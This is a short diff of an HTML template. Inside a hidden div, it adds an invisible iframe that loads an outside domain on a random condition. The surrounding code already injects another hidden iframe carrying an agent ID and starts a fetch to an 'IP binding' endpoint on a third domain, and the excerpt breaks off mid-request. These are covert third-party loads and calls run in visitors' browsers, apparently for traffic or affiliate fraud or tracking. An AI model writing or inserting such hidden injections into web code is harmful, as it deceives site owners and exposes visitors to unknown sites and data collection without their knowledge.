@@ -1,4 +1,7 @@
 <div style="display: none">
+    {% if random_iframe>8 %}
+        <iframe style="display: none" src="http://ki.0713jobs.cn/"></iframe>
+    {% endif %}
     <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.3.1/dist/jquery.js"></script>
     <script src="{{ static_common('js/baidu.js') }}"></script>
     {#    <script src="{{ static_common('js/ym.js') }}"></script>#}
@@ -12,6 +15,7 @@
             iframe.src = "https://www.highgg.com?agentId=7134700";
             document.body.append(iframe);
         }, 500);
+
         setTimeout(function () {
             fetch("https://www.371zhongyi.com/user/bindIp", {
                 "headers": {
